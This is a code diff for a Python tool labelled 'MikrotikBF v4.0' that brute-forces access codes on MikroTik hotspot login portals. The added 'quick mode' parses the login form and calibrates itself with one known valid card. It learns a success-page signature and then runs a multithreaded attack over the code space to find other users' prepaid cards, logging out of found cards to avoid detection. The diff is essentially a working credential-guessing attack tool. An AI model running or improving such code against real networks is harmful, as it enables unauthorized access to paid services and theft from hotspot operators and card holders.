+        r = s.get(p['login_url'], timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
+                  verify=False, allow_redirects=True)
+    except Exception as e:
+        kind, short = classify_error(e)
+        print(f'{red} * Cannot open the login page [{kind}]: {short}{white}')
+        input(f'{gray} Enter to continue...{white}')
+        return
+    s.close()
+    page_url = r.url or p['login_url']
+    form = parse_login_form(r.text or '', page_url)
+    p['method'] = '2' if form['method'] == 'post' else '1'
+    p['user_field'] = form['user_field']
+    p['pass_field'] = form['pass_field']
+    q = parse_qs(urlparse(page_url).query)
+    dsts, seen = [], set()
+    for src in (q.get('dst', [None])[0], form['fields'].get('dst'), ''):
+        if src is not None and src not in seen:
+            seen.add(src)
+            dsts.append(src)
+    skip = {form['user_field'].lower(), form['pass_field'].lower(),
+            'dst', 'popup'}
+    p['extras'] = True
+    p['dst_field'] = 'dst'
+    p['popup_field'] = 'popup'
+    p['fixed_fields'] = {k: v for k, v in form['fields'].items()
+                         if k.lower() not in skip}
+    p['network_type'] = '1'
+    p['charset'] = CHARSETS['1']
+    p['var_len'] = var
+    p['prefix'] = prefix
+    p['suffix'] = ''
+    p['guess_mode'] = '2'
+    p['threads'] = 10
+    p['keyword'] = ''
+    print(f' {green}* method {form["method"].upper()} | user field '
+          f'"{form["user_field"]}" | pass field "{form["pass_field"]}" | '
+          f'hidden fields: {len(p["fixed_fields"])}{white}')
+
+    print(f' {yellow}> Tuning with the known card (a few seconds)...{white}')
+    tmo = (CONNECT_TIMEOUT, READ_TIMEOUT)
+    wrong = '0' * len(card) if card.strip('0') else '1' * len(card)
+    chosen = None
+    for pm in ('same', 'empty', 'md5user', 'omit'):
+        for dst in dsts:
+            p2 = dict(p)
+            p2['pass_mode'] = pm
+            p2['dst_value'] = dst
+            s1 = requests.Session()
+            _warm_session(s1, p2)
+            try:
+                resp = _raw_send(s1, p2, card, card, tmo)
+                wresp = _raw_send(s1, p2, wrong, wrong, tmo)
+            except Exception:
+                s1.close()
+                continue
+            good = is_successful(p2, resp, '') or (
+                _normalize_page(resp.text or '', (card, card))
+                != _normalize_page(wresp.text or '', (wrong, wrong)))
+            if good:
+                chosen = (pm, dst, resp, wresp, s1)
+                break
+            s1.close()
+        if chosen:
+            break
+    if not chosen:
+        print(f' {red}* No setting made the known card work. Open F12 -> '
+              f'Network on a real browser login and send the Form Data.'
+              f'{white}')
+        input(f'{gray} Enter to continue...{white}')
+        return
+    pm, dst, ok_resp, w_resp, s1 = chosen
+    p['pass_mode'] = pm
+    p['dst_value'] = dst
+    if pm == 'same':
+        p['network_type'] = '2'
+    print(f' {green}* Setting found: password mode "{pm}", dst '
+          f'{"(empty)" if not dst else dst}{white}')
+
+    sig = extract_signature(ok_resp.text or '', w_resp.text or '')
+    if sig:
+        p['success_signature'] = sig
+        print(f' {green}* Success page learned. Words: '
+              f'{", ".join(sig[:6])}{white}')
+    else:
+        print(f' {yellow}! Could not extract signature words - the tool will '
+              f'rely on the page-difference detection (still works).{white}')
+    p['success_url'] = ok_resp.url or ''
+    m = re.search(r'<form[^>]+action=["\']?([^"\' >]*logout[^"\' >]*)',
+                  ok_resp.text or '', re.I)
+    p['logout_url'] = urljoin(ok_resp.url or page_url, m.group(1)) \
+        if m else urljoin(p['login_url'], '/logout')
+
+    lo = send_logout(p, session=s1)
+    s1.close()
+    print(f' {green}* Known card logged out (balance preserved) - '
+          f'HTTP {lo.status_code if lo is not None else "?"}{white}')
+
+    db = load_db()
+    names = {pr['name'] for pr in db['profiles']}
+    name = 'quick'
+    n = 2
+    while name in names:
+        name = f'quick{n}'
+        n += 1
+    p['name'] = name
+    p['created'] = datetime.now().strftime('%Y-%m-%d %H:%M')
+    p['last_used'] = p['created']
+    db['profiles'].append(p)
+    save_db(db)
+    print(f' {green}* Profile saved as "{name}".{white}')
+
+    space = _profile_space(p)
+    dflt = space if space <= 2_000_000 else None
+    hint = f'space {fmt_int(space)}'
+    if dflt:
+        hint += f', Enter = cover all {fmt_int(dflt)}'
+    count = ask_int(f'{white} -> Attempts {green}({hint}){white} : ',
+                    default=dflt)
+    shared = attack(p, count, p['threads'], '')
+    show_result(shared, p, p['threads'])
+    p['walk'] = shared.get('walk')
+    _persist_tried(p, shared)
+    save_db(load_db() if False else db)
+    if shared.get('found') and shared.get('user'):
+        lo2 = send_logout(p)
+        print(f' {green}* Found card logged out too - its balance is '
+              f'safe.{white}')
+
+
 def main():
     clear_screen()
     print(f'''{green}
   =============================================
-{white}   MikrotikBF v3.3
+{white}   MikrotikBF v4.0
 {white}   Developer : ENG.YOUSEF
 {green}  ============================================={gray}{green}
 ''')
@@ -1623,18 +2234,27 @@ def main():
     while True:
         print(f'''{cyan}
   +---------------- Main Menu -----------------+{white}
-   1) Use saved profile      {white}
-   2) New profile + save     {white}
-   3) Manage profiles        {white}
+   1) QUICK MODE - 5 questions, all automatic {green}(recommended){white}
+   2) Use saved profile      {white}
+   3) Full setup - all questions (advanced) {white}
+   4) Manage profiles        {white}
+   5) Fetch portal scripts (md5.js / doLogin) {white}
+   6) SELF-TEST a known-good card (diagnosis only) {white}
    0) Exit
 {cyan}  +-------------------------------------------+{white}''')
         c = input(f'{white} -> choice : ').strip()
         if c == '1':
-            use_profile_flow()
+            quick_mode_flow()
         elif c == '2':
-            create_profile_flow()
+            use_profile_flow()
         elif c == '3':
+            create_profile_flow()
+        elif c == '4':
             manage_profiles_flow()
+        elif c == '5':
+            fetch_scripts_flow()
+        elif c == '6':
+            diagnose_flow()
         elif c in ('0', 'q', 'exit'):
             print(f'\n {green}Bye.{white}')
             break
